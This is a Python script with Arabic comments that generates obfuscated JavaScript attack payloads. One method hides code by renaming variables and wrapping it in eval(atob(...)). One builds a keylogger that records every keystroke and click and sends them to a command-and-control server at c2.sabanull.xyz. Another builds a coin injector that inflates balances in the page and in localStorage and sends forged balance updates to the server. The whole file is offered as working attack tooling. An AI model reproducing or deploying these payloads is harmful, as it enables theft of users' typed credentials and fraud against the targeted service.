#!/usr/bin/env python3
# JavaScript Payload Generator

import random
import string

class JavaScriptPayloads:
    def __init__(self):
        self.obfuscation_level = 3
        
    def obfuscate_code(self, code):
        """تعمية كود JavaScript"""
        # استبدال أسماء المتغيرات
        var_map = {}
        lines = code.split('\\n')
        
        for i, line in enumerate(lines):
            # استبدال أسماء المتغيرات العادية
            if 'var ' in line or 'let ' in line or 'const ' in line:
                parts = line.split()
                for j, part in enumerate(parts):
                    if part in ['var', 'let', 'const'] and j+1 < len(parts):
                        var_name = parts[j+1].replace(';', '')
                        if var_name not in var_map:
                            new_name = ''.join(
                                random.choices(string.ascii_lowercase, k=8)
                            )
                            var_map[var_name] = new_name
                            
        # تطبيق الاستبدالات
        for old_name, new_name in var_map.items():
            code = code.replace(old_name, new_name)
            
        # إضافة تعمية إضافية
        if self.obfuscation_level > 1:
            code = self.base64_encode(code)
            
        return code
        
    def base64_encode(self, code):
        """تشفير Base64"""
        import base64
        encoded = base64.b64encode(code.encode()).decode()
        return f"eval(atob('{encoded}'))"
        
    def generate_keylogger(self):
        """توليد keylogger لسرقة ضغطات المفاتيح"""
        keylogger_js = """
        // JavaScript Keylogger
        var loggedKeys = "";
        
        document.addEventListener('keydown', function(event) {
            loggedKeys += event.key;
            
            // إرسال كل 100 ضغطة
            if (loggedKeys.length >= 100) {
                fetch('https://c2.sabanull.xyz/logkeys', {
                    method: 'POST',
                    body: loggedKeys,
                    mode: 'no-cors'
                });
                loggedKeys = "";
            }
        });
        
        // تسجيل النقرات أيضًا
        document.addEventListener('click', function(event) {
            var element = event.target;
            var data = {
                tag: element.tagName,
                id: element.id,
                class: element.className,
                x: event.clientX,
                y: event.clientY
            };
            
            fetch('https://c2.sabanull.xyz/clicks', {
                method: 'POST',
                body: JSON.stringify(data),
                mode: 'no-cors'
            });
        });
        """
        
        return self.obfuscate_code(keylogger_js)
        
    def generate_coin_injector(self):
        """توليد script لحقن العملات"""
        injector_js = """
        // Saba Live Coin Injector
        function injectCoins() {
            // البحث عن عناصر العملات في الذاكرة
            var coinElements = document.querySelectorAll('[class*="coin"], [id*="coin"]');
            
            coinElements.forEach(function(element) {
                // محاولة تعديل القيمة
                if (element.innerText) {
                    var current = parseInt(element.innerText);
                    if (!isNaN(current)) {
                        element.innerText = current + 99999;
                        
                        // إرسال طلب تعديل إلى السيرفر
                        fetch('/api/update_coins', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                new_balance: current + 99999,
                                user_id: window.userId
                            })
                        });
                    }
                }
            });
            
            // محاولة عبر localStorage
            if (localStorage) {
                var keys = Object.keys(localStorage);
                keys.forEach(function(key) {
                    if (key.includes('coin') || key.includes('balance')) {
                        var value = localStorage.getItem(key);
                        var numValue = parseInt(value);
                        if (!isNaN(numValue)) {
                            localStorage.setItem(key, (numValue + 99999).toString());
                        }
                    }
                });
            }
        }
        
        // تنفيذ متكرر
        setInterval(injectCoins, 5000);
        """
        
        return self.obfuscate_code(injector_js)
